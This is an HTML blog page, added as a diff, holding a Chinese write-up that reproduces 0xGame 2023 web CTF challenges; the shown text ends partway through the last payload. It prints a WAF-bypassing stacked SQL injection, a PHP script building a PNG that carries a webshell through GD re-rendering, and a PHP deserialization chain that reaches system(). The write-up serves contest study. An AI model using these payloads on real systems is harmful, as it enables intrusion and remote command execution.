@@ -1,0 +1,1698 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zer0peach">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0xGame 2023 前言 本来是参加了的，但是十月份招新赛太多，而且打CNSS的招新赛耗费了不少精力，所以0xGame就随便看了第一周的，本来以为没什么，但是打完鹏城杯后，看了一个南京邮电大学的web师傅wp，顺便看到了0xGame的wp，看完之后大喊可惜啊，考点非常全面，在我心里能够和CNSS媲美了 不过一个大二的人了做新生赛还这么困难，感觉快废了（呜呜呜呜呜）  第一周就说一个题吧，其他的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0xGAME-WEB 复现">
+<meta property="og:url" content="https://zer0peach.github.io/2023/11/21/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Zer0peach can&#39;t think">
+<meta property="og:description" content="0xGame 2023 前言 本来是参加了的，但是十月份招新赛太多，而且打CNSS的招新赛耗费了不少精力，所以0xGame就随便看了第一周的，本来以为没什么，但是打完鹏城杯后，看了一个南京邮电大学的web师傅wp，顺便看到了0xGame的wp，看完之后大喊可惜啊，考点非常全面，在我心里能够和CNSS媲美了 不过一个大二的人了做新生赛还这么困难，感觉快废了（呜呜呜呜呜）  第一周就说一个题吧，其他的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zer0peach.github.io/images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231121233431755.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231121233909751.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231121234500050.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231121234829429.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122001325958.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122111735938.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122123119964.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122132634217.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122153720563.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122153647044.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122153822385.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122181651148.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122181847546.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122210609455.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122224919226.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231123154925022.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231123000646246.png">
+<meta property="article:published_time" content="2023-11-21T15:22:13.000Z">
+<meta property="article:modified_time" content="2023-11-27T09:23:54.746Z">
+<meta property="article:author" content="Zer0peach">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zer0peach.github.io/images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231121233431755.png">
+  
+  
+  
+  <title>0xGAME-WEB 复现 - Zer0peach can&#39;t think</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zer0peach.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zer0peach&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="0xGAME-WEB 复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-21 23:22" pubdate>
+          2023年11月21日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          33k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          278 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">0xGAME-WEB 复现</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="0xGame-2023"><a href="#0xGame-2023" class="headerlink" title="0xGame 2023"></a>0xGame 2023</h1><blockquote>
+<p>前言</p>
+<p>本来是参加了的，但是十月份招新赛太多，而且打CNSS的招新赛耗费了不少精力，所以0xGame就随便看了第一周的，本来以为没什么，但是打完鹏城杯后，看了一个南京邮电大学的web师傅wp，顺便看到了0xGame的wp，看完之后大喊可惜啊，考点非常全面，在我心里能够和CNSS媲美了</p>
+<p>不过一个大二的人了做新生赛还这么困难，感觉快废了（呜呜呜呜呜）</p>
+</blockquote>
+<h1 id="第一周"><a href="#第一周" class="headerlink" title="第一周"></a>第一周</h1><p>就说一个题吧，其他的确实是新生赛水平</p>
+<h2 id="repo-leak"><a href="#repo-leak" class="headerlink" title="repo_leak"></a>repo_leak</h2><p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231121233431755.png" srcset="/img/loading.gif" lazyload alt="image-20231121233431755"></p>
+<p>提示使用<code>git</code>控制版本</p>
+<p>很久之前看过git执行一些命令，当时没遇到过题目，不知道什么意思</p>
+<p>首先工具要对，之前用的是<code>GitHack</code>，只能下载.git的代码，其他啥也不行</p>
+<p>要用<code>GitHacker</code>，能完善的保留历史数据，所以才能使用git的一些命令</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/WangYihang/GitHacker">https://github.com/WangYihang/GitHacker</a></p>
+<p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231121233909751.png" srcset="/img/loading.gif" lazyload alt="image-20231121233909751"></p>
+<p>遗憾的是明明用了源代码的docker来复现，但是却没有<code>.git</code>泄露，所以只能看wp写了</p>
+<div class="code-wrapper"><pre><code class="hljs bash">githacker --url http://localhost:8013/ --output-folder <span class="hljs-built_in">test</span></code></pre></div>
+
+<p>以下操作在<code>.git</code>生成的文件夹下操作</p>
+<p>然后使用<code>git log</code>查看历史commits （wp说是<code>git commit</code>，但我网上查的是<code>git log</code>）</p>
+<p>会出现如下（wp的图）</p>
+<p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231121234500050.png" srcset="/img/loading.gif" lazyload alt="image-20231121234500050"></p>
+<div class="code-wrapper"><pre><code class="hljs bash">git reset --hard HEAD^    //回退上一个版本</code></pre></div>
+
+<p>cmd起一个http server，访问网址，即可看到flag</p>
+<p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231121234829429.png" srcset="/img/loading.gif" lazyload alt="image-20231121234829429"></p>
+<p>在文件中硬找也可以</p>
+<h1 id="第二周"><a href="#第二周" class="headerlink" title="第二周"></a>第二周</h1><h2 id="ez-sqli"><a href="#ez-sqli" class="headerlink" title="ez_sqli"></a>ez_sqli</h2><p>尝试<code>&#39;</code>报错后是flask框架，泄露了一部分源代码，使用<code>cursor.execute()</code>执行语句</p>
+<p><code>cursor.execute()</code>支持多语句查询，可以使用堆叠注入</p>
+<p>但是waf很严重，没有<code>select database table and or column ...... 空格也被禁了 </code></p>
+<p>想尝试<code>handler</code>，但是<code>and</code>被禁了，这是我没想到的</p>
+<p>看wp，使用MYSQL预处理 (set prepare execute)进行绕过，跟MSSQL的<code>declare exec</code>差不多</p>
+<p>代码特地开了 debug 模式, 这样方便通过报错注入直接回显数据, 当然也可以用时间盲注, 或者一些其它的方式, 比如直接 insert flag</p>
+<p>我想写一句话木马，但是<code>secure_file_priv</code>没权限</p>
+<p>那就报错注入一步一步试</p>
+<p>但是读取时会有长度限制，使用<code>substr</code>就行，或者right、left、mid也行</p>
+<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment"># step 1 </span>
+<span class="hljs-attribute">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select substr((select flag from flag),<span class="hljs-number">1</span>,<span class="hljs-number">31</span>)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>); 
+
+<span class="hljs-comment"># step 2 </span>
+<span class="hljs-attribute">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select substr((select flag from flag),<span class="hljs-number">31</span>,<span class="hljs-number">99</span>)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>);</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs sql"># step <span class="hljs-number">1</span>
+id;<span class="hljs-keyword">set</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-number">0x73656c65637420757064617465786d6c28312c636f6e63617428307837652c2873656c65637420737562737472282873656c65637420666c61672066726f6d20666c6167292c312c333129292c30783765292c31293b</span>;<span class="hljs-keyword">prepare</span><span class="hljs-comment">/**/</span>stmt<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span>;<span class="hljs-keyword">execute</span><span class="hljs-comment">/**/</span>stmt;
+# step <span class="hljs-number">2</span>
+id;<span class="hljs-keyword">set</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-number">0x73656c65637420757064617465786d6c28312c636f6e63617428307837652c2873656c65637420737562737472282873656c65637420666c61672066726f6d20666c6167292c33312c393929292c30783765292c31293b</span>;<span class="hljs-keyword">prepare</span><span class="hljs-comment">/**/</span>stmt<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span>;<span class="hljs-keyword">execute</span><span class="hljs-comment">/**/</span>stmt;</code></pre></div>
+
+<p>很好，又完成了一个知道但没用过的方法</p>
+<h2 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez_upload"></a>ez_upload</h2><p>上传jpg的一句话木马文件，会有函数报错</p>
+<p>这是通过 content-type 判断图片类型并调用对应的 imagecreatefromXXX 和 imgXXX 函数, 这些函数来自 PHP GD 库, 这个库主要负责处理图片</p>
+<p>考点明确就是二次渲染</p>
+<p>如果只是在图片的末尾简单的添加了 PHP 代码并上传, 那么经过二次渲染之后的图片是不会包含这段代码的, 因此需要去找一些绕过 GD 库二次渲染的脚本, 然后再构造图片马</p>
+<p>gif能通过先上传文件后，然后下载上传后的文件，比对区别，在没被处理的地方插入一句话木马</p>
+<p>但是png和jpg都有格式要求，参考文章的做法<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657">https://xz.aliyun.com/t/2657</a></p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,
+           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,
+           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,
+           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,
+           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,
+           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,
+           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,
+           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);
+
+
+
+<span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);
+
+<span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;
+   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];
+   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];
+   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];
+   <span class="hljs-variable">$color</span> = <span class="hljs-title function_ invoke__">imagecolorallocate</span>(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);
+   <span class="hljs-title function_ invoke__">imagesetpixel</span>(<span class="hljs-variable">$img</span>, <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);
+&#125;
+
+<span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;./1.png&#x27;</span>);
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>直接用文章脚本</p>
+<p>我这里docker启动不知道哪里有问题，上传的文件都访问不了，复现不成功</p>
+<p>wp说注意修改文件后缀和 content-type (题目并没有限制文件后缀, 只有二次渲染这一个考点)</p>
+<p>但是修改content-type好像会报错（但好像确实能上传成功）</p>
+<p>结果</p>
+<p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122001325958.png" srcset="/img/loading.gif" lazyload alt="image-20231122001325958"></p>
+<p>真的不行啊，明明都给了docker为什么环境还会出问题呢</p>
+<h2 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h2><p>感觉有点抽象，他自己设置了php版本为5.6，可以直接用修改属性个数绕过<code>__wakeup</code>，但wp说用引用绕过，那么为什么不直接设置php版本高一点呢</p>
+<p>但确实要是版本出的高一点确实也做不出来了</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cache</span> </span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$expired</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$helper</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$helper</span></span>) </span>&#123;
+        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;
+        <span class="hljs-variable language_">$this</span>-&gt;value = <span class="hljs-variable">$value</span>;
+        <span class="hljs-variable language_">$this</span>-&gt;helper = <span class="hljs-variable">$helper</span>;
+
+        <span class="hljs-variable language_">$this</span>-&gt;expired = False;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;
+        <span class="hljs-variable language_">$this</span>-&gt;expired = False;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">expired</span>(<span class="hljs-params"></span>) </span>&#123;
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;expired) &#123;
+            <span class="hljs-variable language_">$this</span>-&gt;helper-&gt;<span class="hljs-title function_ invoke__">clean</span>(<span class="hljs-variable">$this</span>-&gt;key);
+            <span class="hljs-keyword">return</span> True;
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            <span class="hljs-keyword">return</span> False;
+        &#125;
+    &#125;
+&#125;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Storage</span> </span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$store</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;
+        <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-keyword">array</span>();
+    &#125;
+    
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>) </span>&#123;
+        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;store) &#123;
+            <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-keyword">array</span>();
+        &#125;
+
+        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$value</span>-&gt;<span class="hljs-title function_ invoke__">expired</span>()) &#123;
+            <span class="hljs-variable language_">$this</span>-&gt;store[<span class="hljs-variable">$name</span>] = <span class="hljs-variable">$value</span>;
+        &#125;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>];
+    &#125;
+&#125;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcs</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$funcs</span></span>) </span>&#123;
+        <span class="hljs-variable language_">$this</span>-&gt;funcs = <span class="hljs-variable">$funcs</span>;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;
+        <span class="hljs-variable language_">$this</span>-&gt;funcs[<span class="hljs-variable">$name</span>](...<span class="hljs-variable">$args</span>);
+    &#125;
+&#125;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataObject</span> </span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$storage</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;
+        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;data <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;
+            <span class="hljs-variable language_">$this</span>-&gt;storage-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;
+        &#125;
+    &#125;
+&#125;</code></pre></div>
+
+<p>给出wp的payload</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cache</span> </span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$expired</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$helper</span>;
+&#125;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Storage</span> </span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$store</span>;
+&#125;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcs</span>;
+&#125;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataObject</span> </span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$storage</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;
+&#125;
+
+<span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>();
+<span class="hljs-variable">$helper</span>-&gt;funcs = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;clean&#x27;</span> =&gt; <span class="hljs-string">&#x27;system&#x27;</span>);
+
+<span class="hljs-variable">$cache1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cache</span>();
+<span class="hljs-variable">$cache1</span>-&gt;expired = False;      <span class="hljs-comment">//没什么用，实例化时就是false</span>
+
+<span class="hljs-variable">$cache2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cache</span>();
+<span class="hljs-variable">$cache2</span>-&gt;helper = <span class="hljs-variable">$helper</span>;
+<span class="hljs-variable">$cache2</span>-&gt;key = <span class="hljs-string">&#x27;id&#x27;</span>;
+
+<span class="hljs-variable">$storage</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Storage</span>();
+<span class="hljs-variable">$storage</span>-&gt;store = &amp;<span class="hljs-variable">$cache2</span>-&gt;expired;
+
+<span class="hljs-variable">$dataObject</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataObject</span>();
